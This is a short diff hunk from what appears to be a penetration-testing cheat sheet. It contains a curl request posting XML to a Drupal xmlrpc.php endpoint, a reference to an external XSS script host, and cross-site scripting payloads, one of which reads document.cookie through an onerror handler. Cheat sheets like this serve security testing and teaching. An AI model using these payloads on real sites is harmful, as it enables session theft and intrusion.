@@ -36,7 +36,7 @@ curl --data @drupalxml.xml IP/xmlrpc.php
 #XSS
 http://xss.rocks/xss.js
 <script>alert("test");</script>
-        <iframe src=http://URL A MOSTRAR></iframe>
+        <iframe src=http://></iframe>
 	**DOM BASED XSS**
 		<img src="" />
 		<img src="" onerror="alert(document.cookie)" />
